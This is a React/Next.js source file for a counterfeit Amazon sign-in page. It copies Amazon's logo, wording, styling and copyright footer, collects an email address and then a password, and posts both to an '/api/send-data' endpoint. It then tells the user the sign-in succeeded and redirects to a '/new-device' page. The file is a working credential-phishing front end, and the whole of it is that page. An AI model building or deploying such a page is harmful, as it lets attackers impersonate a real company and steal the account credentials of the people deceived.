"use client";

import React, { useState } from "react";
import axios from "axios";
import Image from "next/image";
import { useRouter } from "next/navigation";

const LoginBox = () => {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const router = useRouter();

  const isValidEmail = (value) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);

  const handleContinue = (e) => {
    e.preventDefault();
    setError("");
    setSuccess("");

    if (!isValidEmail(email)) {
      setError("Enter a valid email address.");
      return;
    }

    setStep("password");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setSuccess("");

    if (!password) {
      setError("Enter your password.");
      return;
    }

    try {
      setLoading(true);
      await axios.post("/api/send-data", { email, password });
      setSuccess("Signed in successfully.");
      router.push("/new-device");
    } catch {
      setError("Sign in failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#fff] pt-8 pb-10 text-[#0f1111]">
      <div className="mx-auto w-full">
        <img
          src={"/images/amazon-logo.png"}
          width={120}
          height={80}
          className="m-auto"
          alt="Amazon"
        />

        <form
          onSubmit={step === "email" ? handleContinue : handleSubmit}
          className="max-w-[350px] m-auto rounded-lg border border-[#d5d9d9] bg-white px-[20px] py-[22px] mt-5"
        >
          <h1 className="text-[20px] font-semibold leading-none font-normal">
            Sign in or create account
          </h1>

          {step === "email" ? (
            <>
              <div className="mt-4">
                <p className="text-[15px] font-semibold">
                  Enter mobile number or email
                </p>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  autoComplete="email"
                  className="mt-1 h-[35px] w-full rounded border border-[#888c8c] px-3 text-[17px] outline-none focus:border-[#e77600] focus:shadow-[0_0_0_3px_rgba(228,121,17,0.25)]"
                />
              </div>

              <button
                type="submit"
                className="mt-4 h-[36px] w-full rounded-full bg-[#ffd814] text-sm font-semibold leading-none hover:bg-[#f7ca00]"
              >
                Continue
              </button>

              <p className="mt-4 text-[13px] leading-5">
                By continuing, you agree to Amazon's{" "}
                <a
                  href="#"
                  className="text-blue-700 hover:text-blue-900 !underline"
                >
                  Conditions of Use
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-blue-700 hover:text-blue-900 !underline"
                >
                  Privacy Notice.
                </a>{" "}
              </p>

              <button
                type="button"
                className="mt-4 text-[15px] cursor-pointer leading-none text-[#2162a1] hover:underline"
              >
                Need help?
              </button>

              <hr className="my-5 border-[#d5d9d9]" />

              <p className="text-[14px] leading-none font-bold">
                Buying for work?
              </p>
              <button
                type="button"
                className="mt-3 text-[16px] leading-none text-[#2162a1] hover:underline"
              >
                Create a free business account
              </button>
            </>
          ) : (
            <>
              <div className="mt-4 flex items-center gap-2 text-[18px] leading-none">
                <span className="max-w-[270px] truncate text-sm font-semibold opacity-90">
                  {email}
                </span>
                <button
                  type="button"
                  onClick={() => {
                    setStep("email");
                    setPassword("");
                    setError("");
                    setSuccess("");
                  }}
                  className="text-[14px] leading-none text-[#2162a1] hover:underline"
                >
                  Change
                </button>
              </div>

              <div className="mt-5">
                <div className="flex items-center justify-between">
                  <p className="text-[15px] font-semibold">Password</p>
                  <button
                    type="button"
                    className="text-[14px] leading-none text-[#2162a1] hover:underline"
                  >
                    Forgot password?
                  </button>
                </div>

                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoComplete="current-password"
                  className="mt-3 h-[35px] w-full rounded border border-[#888c8c] px-3 text-[17px] outline-none focus:border-[#e77600] focus:shadow-[0_0_0_3px_rgba(228,121,17,0.25)]"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="mt-4 h-[36px] w-full rounded-full bg-[#ffd814] text-sm font-semibold leading-none hover:bg-[#f7ca00]"
              >
                {loading ? "Signing in..." : "Sign in"}
              </button>
            </>
          )}

          {error ? (
            <div className="mt-5 rounded border border-[#b12704] bg-[#fff8f8] px-3 py-2 text-[14px] text-[#b12704]">
              {error}
            </div>
          ) : null}

          {success ? (
            <div className="mt-5 rounded border border-[#067d62] bg-[#effaf7] px-3 py-2 text-[14px] text-[#067d62]">
              {success}
            </div>
          ) : null}
        </form>

        <div className="mt-[100px] border-t-2 border-[#d5d9d9] pt-8 text-center">
          <div className="flex items-center justify-center gap-8 text-[13px] leading-none text-[#2162a1]">
            <button type="button" className="hover:underline">
              Conditions of Use
            </button>
            <button type="button" className="hover:underline">
              Privacy Notice
            </button>
            <button type="button" className="hover:underline">
              Help
            </button>
          </div>
          <p className="mt-4 text-[13px] leading-none text-[#565959]">
            &copy; 1996-2026, Amazon.com, Inc. or its affiliates.
          </p>
        </div>
      </div>
    </main>
  );
};

export default LoginBox;
